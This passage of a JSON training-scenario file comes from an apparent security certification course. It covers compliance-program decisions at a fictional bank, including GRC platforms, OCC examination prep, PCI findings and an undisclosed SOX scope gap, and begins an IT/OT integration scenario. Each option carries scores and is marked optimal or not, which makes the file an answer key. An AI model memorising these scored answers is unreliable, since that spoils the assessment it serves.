            "id": "b",
            "text": "Implement GRC platform with automated evidence collection, control mapping, and continuous monitoring",
            "feedback": "Excellent approach. A GRC (Governance, Risk, Compliance) platform centralizes control documentation, maps controls to multiple frameworks, automates evidence collection where possible, and tracks compliance status continuously. This transforms compliance from periodic scrambles to ongoing program.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "GRC platforms enable continuous compliance by centralizing control management, automating evidence collection, and providing real-time compliance status.",
            "consequences": {
              "immediate": "Implementation investment but transformational improvement",
              "security_impact": "Continuous visibility into compliance status",
              "business_impact": "Reduced audit preparation burden; consistent evidence quality"
            }
          },
          {
            "id": "c",
            "text": "Assign dedicated compliance analysts to each framework to manage evidence collection",
            "feedback": "Dedicated staff helps but doesn't solve the underlying process problem. Analysts become bottlenecks and single points of failure. Without proper tools and processes, they'll struggle with the same issues - just with dedicated headcount doing the struggling.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "People are important but can't compensate for broken processes. Effective compliance requires process improvement, not just more staff.",
            "consequences": {
              "immediate": "More staff but same process problems",
              "security_impact": "Compliance quality depends on individual analysts",
              "business_impact": "Expensive staffing solution; key person risk"
            }
          },
          {
            "id": "d",
            "text": "Require control owners to maintain evidence in their existing systems; compliance team collects during audits",
            "feedback": "Distributed evidence with centralized collection during audits is the current failed model. Control owners have day jobs and won't maintain audit-ready evidence without structure. Collection during audits creates the scrambles you're trying to eliminate.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Evidence management must be integrated into operational processes, not bolted on during audit preparation.",
            "consequences": {
              "immediate": "Minimal change from current state",
              "security_impact": "Evidence gaps continue",
              "business_impact": "Audit scrambles continue; control owner burden increases"
            }
          }
        ],
        "hints": [
          "Consider what causes the scramble before each audit",
          "Think about continuous compliance versus point-in-time assessment"
        ]
      },
      {
        "id": "dp3",
        "sequence": 3,
        "title": "Preparing for OCC Examination",
        "situation": "The OCC IT examination is scheduled for six months from now. Based on previous examination and industry trends, you expect focus on:\n\n- Third-party risk management (previous MRA)\n- IT risk assessment process (previous MRA)\n- Cybersecurity program effectiveness\n- Cloud computing risks\n- Operational resilience\n\nThe CISO asks: 'How do we prepare? Last time we were caught off guard by some questions.'\n\nHow do you approach examination preparation?",
        "options": [
          {
            "id": "a",
            "text": "Wait until 60 days before examination to start preparation; earlier preparation wastes time",
            "feedback": "60 days is not enough time to address significant gaps. MRAs require demonstrated remediation with evidence of sustained compliance. Last-minute preparation creates stress and may not address fundamental issues. Examiners can tell when compliance was rushed.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Regulatory examination preparation should be ongoing. Six months allows meaningful improvement; 60 days allows only documentation cleanup.",
            "consequences": {
              "immediate": "No immediate burden but insufficient preparation time",
              "security_impact": "Gaps remain unaddressed",
              "business_impact": "Poor examination outcome likely; additional MRAs or enforcement"
            }
          },
          {
            "id": "b",
            "text": "Begin immediately with MRA remediation validation, gap assessment against expected topics, and documentation review",
            "feedback": "Excellent approach. Start now with previous findings - validate MRA remediation is complete and sustained. Assess gaps against expected examination focus areas. Review and update documentation. Six months allows genuine improvement, not just audit theater.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Examination preparation should begin immediately when exam is scheduled. Time allows for genuine improvement rather than documentation exercises.",
            "consequences": {
              "immediate": "Structured preparation with time for genuine improvement",
              "security_impact": "Gaps identified and remediated before examination",
              "business_impact": "Better examination outcome; demonstrates mature program"
            }
          },
          {
            "id": "c",
            "text": "Focus exclusively on the two previous MRAs since those are guaranteed examination focus areas",
            "feedback": "MRAs definitely need attention, but exclusive focus ignores other areas examiners will review. Cybersecurity is increasing examination focus regardless of previous findings. Narrowly focusing on MRAs while ignoring emerging areas creates new risks.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Examination preparation must address previous findings AND emerging focus areas. Regulatory priorities evolve.",
            "consequences": {
              "immediate": "MRA focus but other gaps ignored",
              "security_impact": "New findings in areas not reviewed",
              "business_impact": "May close old MRAs but receive new ones"
            }
          },
          {
            "id": "d",
            "text": "Hire external consultants to conduct a mock examination and identify all gaps",
            "feedback": "Mock examinations can be valuable but shouldn't be the primary preparation strategy. Consultants identify gaps but may not understand your environment well enough to prioritize effectively. You know your program; start with self-assessment and use consultants to validate.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "External assessments are useful validators but shouldn't replace internal knowledge and ownership of compliance program.",
            "consequences": {
              "immediate": "Expensive external assessment",
              "security_impact": "Gap identification but may miss context-specific issues",
              "business_impact": "Consultant dependency; may not build internal capability"
            }
          }
        ],
        "hints": [
          "Six months is both a long time and not very long - what can realistically be accomplished?",
          "Think about what examiners want to see: genuine program improvement or last-minute fixes"
        ]
      },
      {
        "id": "dp4",
        "sequence": 4,
        "title": "Managing Audit Findings",
        "situation": "Your external PCI QSA has completed their assessment and presented findings:\n\n**Critical (must remediate before certification):**\n- Firewall rules include 'any-any' permits in cardholder data environment\n- Three systems in CDE missing current antivirus signatures\n\n**High:**\n- Encryption keys for stored cardholder data haven't been rotated in 3 years\n- No network segmentation documentation\n\n**Medium:**\n- Quarterly internal vulnerability scans not consistently performed\n- Security awareness training completion below 100%\n\nThe QSA needs evidence of critical remediation within 30 days to proceed with certification. How do you approach remediation?",
        "options": [
          {
            "id": "a",
            "text": "Focus all resources on critical findings only; address others after certification",
            "feedback": "While critical findings need immediate attention, ignoring high findings creates ongoing risk and technical debt. The encryption key issue is a significant security risk. Certification isn't the goal - security is. Address critical immediately but plan for high findings in parallel.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Audit findings prioritization shouldn't mean ignoring lower-priority items. All findings represent real risks requiring remediation.",
            "consequences": {
              "immediate": "Critical findings addressed; others deferred",
              "security_impact": "Significant risks remain (e.g., 3-year-old encryption keys)",
              "business_impact": "Certification achieved but false sense of security"
            }
          },
          {
            "id": "b",
            "text": "Develop remediation plan addressing all findings with realistic timelines, prioritizing critical but tracking all",
            "feedback": "Excellent approach. Critical findings get immediate action to meet certification timeline. High and medium findings get remediation plans with realistic timelines. All findings are tracked to closure. This demonstrates mature remediation management and addresses actual security risks.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Effective remediation management addresses all findings with appropriate prioritization. Tracking to closure ensures nothing is forgotten.",
            "consequences": {
              "immediate": "Comprehensive remediation plan; critical findings prioritized",
              "security_impact": "All security gaps addressed systematically",
              "business_impact": "Certification achieved; sustainable compliance demonstrated"
            }
          },
          {
            "id": "c",
            "text": "Challenge the findings with the QSA; some seem overstated based on our compensating controls",
            "feedback": "Disputing findings without strong basis damages credibility and wastes time. If you have legitimate compensating controls, document them properly. But 'any-any' firewall rules and missing AV signatures are clear violations with little room for interpretation. Fix the issues.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Disputing clear findings damages credibility. Save disagreements for truly ambiguous situations. Fix obvious problems promptly.",
            "consequences": {
              "immediate": "Delayed remediation while disputing; damaged QSA relationship",
              "security_impact": "Real vulnerabilities remain while arguing",
              "business_impact": "May delay certification; appears evasive"
            }
          },
          {
            "id": "d",
            "text": "Request extension from QSA to address all findings comprehensively before certification",
            "feedback": "Extensions may not be possible due to certification deadlines and business requirements. More importantly, the critical findings are straightforward to fix quickly. Firewall rules and AV signatures can be addressed in days, not months. Don't delay when quick fixes are possible.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Don't request extensions for issues that can be fixed quickly. Demonstrate capability by addressing findings promptly.",
            "consequences": {
              "immediate": "Delayed certification with business impact",
              "security_impact": "Critical vulnerabilities persist longer than necessary",
              "business_impact": "Card processing compliance gap; business risk"
            }
          }
        ],
        "hints": [
          "What's the difference between addressing critical findings and addressing all findings?",
          "Consider both the certification requirement and actual security improvement"
        ]
      },
      {
        "id": "dp5",
        "sequence": 5,
        "title": "Internal Audit Collaboration",
        "situation": "Internal Audit has approached you about their annual IT audit plan. The Chief Audit Executive (CAE) says: 'We need to test IT general controls for SOX, but we'd also like to provide value beyond compliance checkbox. How can we work together?'\n\nSome IT managers view Internal Audit as adversarial and minimize cooperation. You see an opportunity to improve the relationship.\n\nHow do you approach collaboration with Internal Audit?",
        "options": [
          {
            "id": "a",
            "text": "Maintain arm's length relationship; Internal Audit needs independence and shouldn't collaborate closely",
            "feedback": "Independence doesn't mean adversarial or isolated. Internal Audit can collaborate on scope and approach while maintaining objectivity. Arm's length relationships create defensive dynamics and miss opportunities for Internal Audit to provide value beyond compliance testing.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Internal Audit independence relates to objectivity in testing and reporting, not isolation from the business. Collaboration improves audit quality and value.",
            "consequences": {
              "immediate": "Continued adversarial dynamic",
              "security_impact": "Audit insights not leveraged for security improvement",
              "business_impact": "Internal Audit seen as burden, not value-add"
            }
          },
          {
            "id": "b",
            "text": "Partner on risk-based audit planning, share compliance intelligence, and use audit findings as improvement input",
            "feedback": "Excellent approach. Share your risk assessment to inform audit planning. Provide compliance intelligence so audits can target higher-risk areas. Use audit findings constructively to improve security program. This makes Internal Audit a partner in security improvement while respecting their independence.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Internal Audit and security compliance are natural partners. Collaboration on risk-based planning and constructive use of findings benefits both functions.",
            "consequences": {
              "immediate": "Improved relationship and audit relevance",
              "security_impact": "Audit findings drive actual security improvements",
              "business_impact": "Internal Audit provides value beyond compliance checkbox"
            }
          },
          {
            "id": "c",
            "text": "Request that Internal Audit focus only on SOX ITGC; other areas are already covered by external assessments",
            "feedback": "Limiting Internal Audit to SOX minimizes their potential value. External assessments provide point-in-time views; Internal Audit can provide continuous monitoring. They also understand your organization better than external assessors. Leverage their capabilities, don't constrain them.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Internal Audit provides unique value: organizational knowledge, continuous presence, and independence. Leverage these strengths.",
            "consequences": {
              "immediate": "Narrow audit focus",
              "security_impact": "Internal audit insights not leveraged",
              "business_impact": "Internal Audit underutilized; continuous monitoring gap"
            }
          },
          {
            "id": "d",
            "text": "Pre-review all audit findings before they're reported to ensure accuracy and context",
            "feedback": "While factual accuracy review is reasonable, pre-reviewing findings to influence reporting undermines audit independence. Management response comes after findings are issued, not before. Appearing to influence audit results damages credibility of both functions.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Audit independence must be protected. Management reviews findings for factual accuracy, but doesn't pre-approve what auditors report.",
            "consequences": {
              "immediate": "Potential appearance of compromised independence",
              "security_impact": "Audit objectivity questioned",
              "business_impact": "Audit Committee and regulators may question audit quality"
            }
          }
        ],
        "hints": [
          "Think about what makes Internal Audit effective versus what makes them adversarial",
          "Consider how audit findings can drive security improvement"
        ]
      },
      {
        "id": "dp6",
        "sequence": 6,
        "title": "Continuous Compliance Monitoring",
        "situation": "After addressing immediate audit needs, the CFO asks about sustainable compliance: 'We can't keep scrambling before every audit. How do we know we're compliant all the time, not just when auditors show up?'\n\nYou have budget for additional tools and one additional compliance analyst headcount.\n\nHow do you build continuous compliance monitoring?",
        "options": [
          {
            "id": "a",
            "text": "Increase audit frequency - monthly internal assessments of all control areas",
            "feedback": "More frequent assessments without automation just increases burden on control owners and compliance team. Monthly full assessments aren't sustainable. The goal is continuous visibility with reasonable effort, not exhausting everyone with constant audits.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Continuous compliance requires automation and intelligent monitoring, not just more frequent manual assessments.",
            "consequences": {
              "immediate": "Heavy assessment burden; audit fatigue",
              "security_impact": "Compliance measured more frequently but team exhausted",
              "business_impact": "Unsustainable workload; control owner resistance"
            }
          },
          {
            "id": "b",
            "text": "Implement automated compliance monitoring for key controls with exception-based alerting and dashboard visibility",
            "feedback": "Excellent approach. Automate monitoring for controls that can be technically verified (configurations, access, patching). Alert on exceptions rather than reviewing everything. Dashboard provides continuous visibility. Manual assessment reserved for controls requiring human judgment. This is sustainable continuous compliance.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Continuous compliance monitoring uses automation for technical controls, exception-based alerting for efficiency, and dashboards for visibility.",
            "consequences": {
              "immediate": "Implementation effort but sustainable monitoring",
              "security_impact": "Near-real-time visibility into compliance status",
              "business_impact": "Reduced audit preparation; proactive gap identification"
            }
          },
          {
            "id": "c",
            "text": "Rely on annual external assessments; if we pass PCI and SOX, we're compliant",
            "feedback": "Annual assessments are snapshots that may not reflect current state. Compliance can degrade between assessments. External assessors don't catch everything. Relying solely on annual assessments means discovering gaps only when auditors find them - too late to prevent impact.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "External assessments are validation points, not continuous assurance. Compliance requires ongoing attention between formal assessments.",
            "consequences": {
              "immediate": "Minimal investment in monitoring",
              "security_impact": "Compliance gaps may exist undetected between assessments",
              "business_impact": "Unpleasant surprises at audit time"
            }
          },
          {
            "id": "d",
            "text": "Use the new analyst for weekly spot-checks of random controls",
            "feedback": "Random spot-checks provide some assurance but miss the efficiency of automated monitoring. One analyst can't effectively monitor all controls manually. Use automation for technical controls; use the analyst for risk assessment, exception handling, and controls requiring human judgment.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Human resources should focus on activities requiring judgment, not manual checking that can be automated.",
            "consequences": {
              "immediate": "Some monitoring but limited coverage",
              "security_impact": "Gaps may be missed between spot-checks",
              "business_impact": "Analyst becomes bottleneck; inefficient use of headcount"
            }
          }
        ],
        "hints": [
          "What can be monitored automatically versus what requires human assessment?",
          "Think about sustainable workload for the compliance team"
        ]
      },
      {
        "id": "dp7",
        "sequence": 7,
        "title": "SOX Compliance Challenge",
        "situation": "The SOX audit begins in two weeks. External auditors have provided their test list. Your ITGC scope includes:\n\n- Access controls for financial applications\n- Change management for financial systems\n- Computer operations (job scheduling, backups)\n- Program development controls\n\nDuring preparation, you discover a problem: the new loan origination system went live 6 months ago. It processes $2B in loans annually. However:\n- It wasn't added to the SOX scope\n- No ITGC controls were designed for it\n- Access management uses default vendor settings\n\nHow do you handle this discovery?",
        "options": [
          {
            "id": "a",
            "text": "Keep quiet and hope auditors don't notice; raising it creates problems",
            "feedback": "Concealing material control gaps from auditors is a serious ethics violation and potentially illegal for SOX-covered controls. If auditors discover the gap (and they likely will), the concealment is worse than the gap itself. This approach creates personal liability and damages trust.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Never conceal control gaps from auditors. Transparent disclosure with remediation plan is always better than concealment.",
            "consequences": {
              "immediate": "Temporary avoidance but significant risk",
              "security_impact": "Uncontrolled system remains unaddressed",
              "business_impact": "If discovered: material weakness finding, auditor relationship damage, potential legal issues"
            }
          },
          {
            "id": "b",
            "text": "Immediately disclose to auditors, assess control gaps, and develop remediation plan",
            "feedback": "Excellent approach. Proactive disclosure demonstrates integrity and control awareness. Assessing the actual gaps enables informed discussion about materiality and remediation. A credible remediation plan shows management commitment. This may still result in findings, but handled professionally.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Proactive disclosure with remediation plan is always the correct approach. Auditors respect transparency and commitment to fix problems.",
            "consequences": {
              "immediate": "Difficult conversation but professional handling",
              "security_impact": "Control gaps identified and remediation begins",
              "business_impact": "Potential finding but relationship preserved; demonstrates control environment awareness"
            }
          },
          {
            "id": "c",
            "text": "Quickly implement basic controls before auditors arrive; avoid documentation to minimize evidence of the gap",
            "feedback": "Rushing to implement controls creates poorly designed controls that may not be effective. Avoiding documentation creates bigger problems - SOX requires documented controls. The timeline (2 weeks) isn't enough for proper control design anyway. This approach fails on multiple levels.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Two weeks isn't enough to properly implement ITGC controls. Rushed implementation creates more problems than transparent disclosure.",
            "consequences": {
              "immediate": "Chaotic implementation with poor results",
              "security_impact": "Ineffective controls hastily implemented",
              "business_impact": "Auditors will recognize rushed implementation; worse finding likely"
            }
          },
          {
            "id": "d",
            "text": "Argue the system is immaterial to financial reporting and shouldn't be in SOX scope",
            "feedback": "Attempting to exclude a $2B loan origination system from SOX scope isn't credible. Loan origination directly affects financial statements. Scope determination should have happened earlier. Trying to argue materiality now looks like avoidance. The system clearly needs to be in scope.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Scope decisions should be made proactively, not reactively when gaps are discovered. Arguing materiality for obviously significant systems damages credibility.",
            "consequences": {
              "immediate": "Argument unlikely to succeed; damages credibility",
              "security_impact": "System remains uncontrolled",
              "business_impact": "Auditors will likely disagree; relationship strained"
            }
          }
        ],
        "hints": [
          "What do auditors value most - perfection or integrity?",
          "Consider the timeline and what's realistically possible"
        ]
      },
      {
        "id": "dp8",
        "sequence": 8,
        "title": "Regulatory Examination Response",
        "situation": "The OCC examination has concluded. Examiners have shared preliminary findings:\n\n**Matters Requiring Attention (MRAs):**\n1. Third-party risk management still has gaps despite previous MRA (risk assessments not comprehensive for all critical vendors)\n2. Patch management SLAs not met for critical vulnerabilities\n\n**Observations (less severe):**\n1. Security awareness training metrics not reported to board\n2. Incident response plan not tested in 18 months\n\nThe examiners want to discuss these findings with the Board. Management has one week to prepare a response.\n\nHow do you approach the response?",
        "options": [
          {
            "id": "a",
            "text": "Challenge the findings vigorously; we've made significant progress on third-party risk",
            "feedback": "Challenging examiners aggressively is counterproductive. If gaps remain, acknowledge them. Highlighting progress is appropriate, but arguing that findings are wrong when gaps exist damages credibility and may escalate regulatory concern about management's self-awareness.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Regulatory findings should be addressed constructively. Challenge only clear factual errors; acknowledge legitimate gaps.",
            "consequences": {
              "immediate": "Adversarial dynamic with examiners",
              "security_impact": "Underlying issues not addressed",
              "business_impact": "Elevated regulatory scrutiny; potential enforcement"
            }
          },
          {
            "id": "b",
            "text": "Accept all findings without discussion to avoid confrontation; focus on quick remediation",
            "feedback": "Complete capitulation misses the opportunity to provide context and ensure examiners have accurate understanding. Some findings may warrant discussion - not to argue, but to ensure accuracy. Additionally, the response should address root causes, not just quick fixes.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Providing context and ensuring accurate understanding is appropriate. Blind acceptance may result in remediation that misses the point.",
            "consequences": {
              "immediate": "Findings accepted but context not provided",
              "security_impact": "May address symptoms not causes",
              "business_impact": "Remediation may not address examiner's actual concern"
            }
          },
          {
            "id": "c",
            "text": "Prepare factual response acknowledging gaps, explaining progress, identifying root causes, and committing to specific remediation with timeline",
            "feedback": "Excellent approach. Acknowledge legitimate gaps while providing context on progress made. Root cause analysis shows self-awareness. Specific remediation commitments with timelines demonstrate management accountability. This is professional, constructive response that builds examiner confidence.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Effective regulatory response acknowledges gaps, provides context, identifies root causes, and commits to specific remediation. This builds examiner confidence in management.",
            "consequences": {
              "immediate": "Constructive dialogue with examiners",
              "security_impact": "Root causes identified and addressed",
              "business_impact": "Demonstrates management competence and commitment"
            }
          },
          {
            "id": "d",
            "text": "Minimize Board involvement; these are operational issues that don't require board-level attention",
            "feedback": "MRAs specifically require board attention. Regulators expect boards to provide oversight of significant control issues. Minimizing board involvement signals to examiners that governance is weak and increases regulatory concern. Boards should be informed and engaged.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Board oversight of significant control issues is a regulatory expectation. MRAs require board-level attention and response.",
            "consequences": {
              "immediate": "Board not properly informed",
              "security_impact": "Governance gap perpetuated",
              "business_impact": "Examiner concern about board oversight; potential additional findings"
            }
          }
        ],
        "hints": [
          "What do examiners really want to see from management?",
          "Think about the balance between accepting findings and providing context"
        ]
      },
      {
        "id": "dp9",
        "sequence": 9,
        "title": "Third-Party Attestation Strategy",
        "situation": "Your wealth management platform serves institutional clients who are increasingly requesting security attestations. Different clients have requested:\n\n- SOC 2 Type II report (most common request)\n- SOC 2 + HITRUST certification\n- ISO 27001 certification\n- Custom security questionnaires (each client has their own)\n\nThe Sales team is frustrated: 'Compliance requirements are affecting our ability to close deals. We need to give clients what they ask for.'\n\nHow do you approach this attestation demand?",
        "options": [
          {
            "id": "a",
            "text": "Pursue all requested certifications to satisfy all clients",
            "feedback": "Pursuing every certification clients request is unsustainably expensive. SOC 2, HITRUST, and ISO 27001 have significant overlap - pursuing all means redundant assessments. Strategic selection of attestations that satisfy majority needs is more efficient.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Attestation strategy should focus on frameworks that satisfy the most requirements efficiently, not every certification requested.",
            "consequences": {
              "immediate": "Very high assessment costs; audit fatigue",
              "security_impact": "Resources spent on assessments not security improvement",
              "business_impact": "Expensive compliance; may still not satisfy all custom requests"
            }
          },
          {
            "id": "b",
            "text": "Start with SOC 2 Type II as baseline, use it to address questionnaires, and evaluate additional certifications based on business case",
            "feedback": "Excellent approach. SOC 2 Type II is the most commonly requested and provides foundation for questionnaire responses. Additional certifications evaluated based on specific business requirements (e.g., healthcare clients may require HITRUST). This balances client needs with efficient resource use.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Attestation strategy should start with most commonly requested framework and expand based on demonstrated business need.",
            "consequences": {
              "immediate": "Focused attestation effort with clear priority",
              "security_impact": "Control framework established; expanded as needed",
              "business_impact": "Most client requirements met; business case for additional certifications"
            }
          },
          {
            "id": "c",
            "text": "Decline attestation requests; our security should be evaluated by our regulatory compliance status",
            "feedback": "Declining client attestation requests loses business. Institutional clients have their own compliance requirements and need assurance. Regulatory compliance doesn't provide the specific assurance clients need about your controls. Attestations are a business requirement.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Client attestation requirements are business requirements. Effective compliance programs address client needs, not just regulatory requirements.",
            "consequences": {
              "immediate": "Lost business opportunities",
              "security_impact": "No external validation of security controls",
              "business_impact": "Institutional clients go elsewhere"
            }
          },
          {
            "id": "d",
            "text": "Complete custom questionnaires for each client; certifications are expensive and questionnaires are free",
            "feedback": "Custom questionnaires are not free - each requires significant effort to complete. Without underlying attestation, answers lack credibility. Questionnaire responses without certification become a perpetual burden. SOC 2 report can be shared with multiple clients; questionnaires cannot.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Standard attestations (SOC 2) can satisfy multiple clients and provide credibility for questionnaire responses. Custom questionnaires alone don't scale.",
            "consequences": {
              "immediate": "High questionnaire volume; inconsistent answers",
              "security_impact": "No systematic control validation",
              "business_impact": "Questionnaire burden grows with client base; answers questioned without certification"
            }
          }
        ],
        "hints": [
          "Consider which attestation satisfies the most requirements efficiently",
          "Think about scalability as client base grows"
        ]
      },
      {
        "id": "dp10",
        "sequence": 10,
        "title": "Compliance Program Maturity",
        "situation": "After 18 months, your compliance program has stabilized: GRC platform implemented, MRAs closed, certifications achieved, and continuous monitoring operational. The CEO asks: 'We've invested significantly in compliance. How do we know if we're mature enough? What's next?'\n\nHow do you assess and advance compliance program maturity?",
        "options": [
          {
            "id": "a",
            "text": "We're passing audits consistently; maturity is proven by our certification success",
            "feedback": "Passing audits indicates minimum acceptable compliance, not maturity. Mature programs prevent issues proactively, not just respond to audits. Certification is necessary but not sufficient for program maturity. True maturity goes beyond compliance to risk optimization.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Audit success indicates compliance, not maturity. Mature programs demonstrate continuous improvement, efficiency, and value beyond compliance.",
            "consequences": {
              "immediate": "Complacency based on audit success",
              "security_impact": "Program improvement stalls",
              "business_impact": "Missed opportunities for efficiency and value"
            }
          },
          {
            "id": "b",
            "text": "Conduct maturity assessment against industry framework, identify advancement opportunities, develop roadmap for continuous improvement",
            "feedback": "Excellent approach. Formal maturity assessment provides objective measurement. Industry frameworks (like CMMI or custom models) provide structure. Identifying specific advancement opportunities and developing a roadmap demonstrates commitment to continuous improvement beyond compliance.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Maturity assessment provides objective measurement of program capabilities. Continuous improvement roadmap drives advancement beyond minimum compliance.",
            "consequences": {
              "immediate": "Clear understanding of current state and improvement path",
              "security_impact": "Continuous program improvement beyond compliance",
              "business_impact": "Demonstrable value; informed investment decisions"
            }
          },
          {
            "id": "c",
            "text": "Benchmark against peer financial institutions to see how we compare",
            "feedback": "Benchmarking provides context but doesn't define maturity. Peer comparison doesn't account for your specific risk profile or business model. Being average compared to peers isn't the goal. Focus on your own maturity progression and specific improvement needs.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Benchmarking provides context but shouldn't drive maturity strategy. Focus on your specific needs and continuous improvement.",
            "consequences": {
              "immediate": "Comparative data without improvement direction",
              "security_impact": "May drive to average rather than appropriate level",
              "business_impact": "Investment based on peers rather than needs"
            }
          },
          {
            "id": "d",
            "text": "Reduce compliance investment now that program is stable; maintenance mode is appropriate",
            "feedback": "Stable doesn't mean done. Regulatory requirements evolve, technology changes, and threats adapt. Maintenance mode leads to program degradation. Mature programs continuously improve efficiency while maintaining effectiveness, not simply reduce investment.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Compliance programs require ongoing investment. Maturity means efficiency, not minimal investment.",
            "consequences": {
              "immediate": "Short-term cost savings",
              "security_impact": "Program begins to degrade",
              "business_impact": "Future compliance failures; rebuild costs exceed maintenance costs"
            }
          }
        ],
        "hints": [
          "What's the difference between passing audits and being mature?",
          "Consider what value a mature compliance program provides beyond avoiding findings"
        ]
      }
    ],
    "glossary": {
      "MRA": "Matter Requiring Attention - regulatory finding requiring formal response and remediation",
      "ITGC": "IT General Controls - controls over IT environment supporting financial reporting (SOX focus)",
      "GRC": "Governance, Risk, and Compliance - integrated approach and often technology platform",
      "SOC_2": "Service Organization Controls 2 - attestation report on security controls",
      "QSA": "Qualified Security Assessor - certified PCI DSS assessor",
      "material_weakness": "SOX deficiency with reasonable possibility of material financial misstatement",
      "continuous_compliance": "Ongoing monitoring versus point-in-time assessment approach",
      "control_framework_rationalization": "Mapping controls to multiple compliance requirements to reduce duplication",
      "three_lines_model": "Governance model with operational management, risk/compliance, and internal audit as three lines",
      "attestation": "Formal certification or report providing assurance to third parties"
    },
    "outcomes": {
      "optimal_path_summary": "You built a mature compliance program at Apex Financial Services by implementing unified control framework mapped to multiple requirements, deploying GRC platform for continuous compliance monitoring, and developing systematic approaches to regulatory examinations and audit management. The program now provides efficient compliance across multiple frameworks while delivering value beyond audit preparation through proactive risk identification and stakeholder assurance.",
      "key_achievements": [
        "Unified control framework reducing compliance duplication",
        "GRC platform enabling continuous compliance monitoring",
        "Successful regulatory examination with MRAs closed",
        "Efficient audit finding remediation process",
        "Productive Internal Audit partnership",
        "Strategic attestation approach satisfying client needs",
        "Continuous improvement roadmap for program advancement"
      ],
      "lessons_learned": [
        "Control framework rationalization reduces compliance burden significantly",
        "Continuous compliance monitoring prevents audit scrambles",
        "Regulatory examination preparation should begin immediately",
        "Finding remediation must address root causes, not just symptoms",
        "Internal Audit partnership provides value beyond compliance checkbox",
        "Proactive disclosure with remediation plan is always the right approach",
        "Attestation strategy should focus on most common requirements first",
        "Passing audits indicates minimum compliance, not program maturity",
        "Continuous improvement drives advancement beyond compliance minimums"
      ],
      "connections_to_other_scenarios": [
        "Security Governance (D5-SIM-001) - Governance enables compliance framework",
        "Risk Management (D5-SIM-002) - Risk assessment informs compliance priorities",
        "Third-Party Risk (D5-SIM-003) - Vendor compliance is major regulatory focus",
        "Vulnerability Management (D4-SIM-003) - Patch management is common audit focus",
        "IAM (D4-SIM-004) - Access controls are fundamental ITGC"
      ]
    },
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D5-SIM-005",
    "title": "Security Program Integration",
    "domain": 5,
    "type": "SIM",
    "difficulty": "advanced",
    "time_estimate": 55,
    "role": "Director of Security",
    "organization": {
      "name": "Nexus Manufacturing Group",
      "industry": "Manufacturing / Industrial",
      "size": "Global manufacturer with 15,000 employees, 8 manufacturing facilities across North America and Europe, $3.2B revenue",
      "environment": "Hybrid IT/OT environment with corporate IT systems, manufacturing execution systems (MES), industrial control systems (ICS), and SCADA networks. Supply chain spans 400+ suppliers. Recent digital transformation initiative adding IoT sensors and cloud-based analytics.",
      "current_state": "Security program exists but is fragmented: IT security reports to CIO, OT security reports to VP Operations, and compliance reports to General Counsel. Recent ransomware incident disrupted production for 3 days. Board now demanding unified security program with clear accountability."
    },
    "introduction": "You've been hired as Director of Security at Nexus Manufacturing to unify and mature the security program following a ransomware incident that cost $8M in lost production. The Board wants a cohesive security strategy addressing IT, OT, and supply chain risks with clear governance and measurable outcomes. You'll integrate previously siloed security functions, establish enterprise risk management, and build a program that protects both information systems and manufacturing operations.",
    "learning_objectives": [
      "Integrate security program elements across governance, risk, and compliance",
      "Address unique challenges of IT/OT convergence in security programs",
      "Build security programs that align with business objectives",
      "Develop enterprise-wide risk management approaches",
      "Create sustainable security programs with executive support"
    ],
    "decision_points": [
      {
        "id": "dp1",
        "sequence": 1,
        "title": "Security Program Assessment",
        "situation": "Your first month assessment reveals significant fragmentation:\n\n**IT Security (reports to CIO):**\n- Mature endpoint protection and network security\n- SOC monitors IT network only\n- Vulnerability management for IT systems\n- No visibility into OT networks\n\n**OT Security (reports to VP Operations):**\n- Basic network segmentation between IT and OT\n- No centralized monitoring\n- Vendors manage most ICS/SCADA security\n- Safety systems prioritized over security\n\n**Compliance (reports to General Counsel):**\n- SOX ITGC compliance for ERP\n- Customer security questionnaire responses\n- No formal risk management framework\n- Privacy compliance for GDPR (European operations)\n\nThe CEO asks: 'Where do we start? We need quick wins but also sustainable improvement.'\n\nWhat's your first priority?",
        "options": [
          {
            "id": "a",
            "text": "Focus on OT security since that's where the ransomware incident caused production impact",
            "feedback": "While OT security needs attention, jumping directly to OT without understanding the broader program creates more silos. The ransomware likely entered through IT and spread to OT - solving OT alone doesn't address the root cause. You need integrated visibility first.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Incident response shouldn't drive security strategy. Address root causes systematically rather than reacting to last incident.",
            "consequences": {
              "immediate": "OT security improves in isolation",
              "security_impact": "IT-OT gaps remain; attack paths persist",
              "business_impact": "Investment without addressing root cause"
            }
          },
          {
            "id": "b",
            "text": "Establish unified governance structure first, then build integrated program systematically",
